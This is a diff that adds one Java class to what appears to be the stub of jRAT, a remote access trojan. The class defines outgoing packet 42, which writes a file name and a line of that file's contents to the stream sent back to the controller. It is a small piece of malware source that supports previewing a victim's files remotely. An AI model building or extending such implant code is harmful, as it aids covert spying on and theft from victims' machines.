@@ -1,0 +1,29 @@
+package su.jrat.stub.packets.outgoing;
+
+import java.io.DataOutputStream;
+
+import su.jrat.common.io.StringWriter;
+
+
+public class Packet42FilePreview extends AbstractOutgoingPacket {
+
+	private String file;
+	private String line;
+
+	public Packet42FilePreview(String file, String line) {
+		this.file = file;
+		this.line = line;
+	}
+
+	@Override
+	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+		sw.writeLine(file);
+		sw.writeLine(line);
+	}
+
+	@Override
+	public byte getPacketId() {
+		return 42;
+	}
+
+}
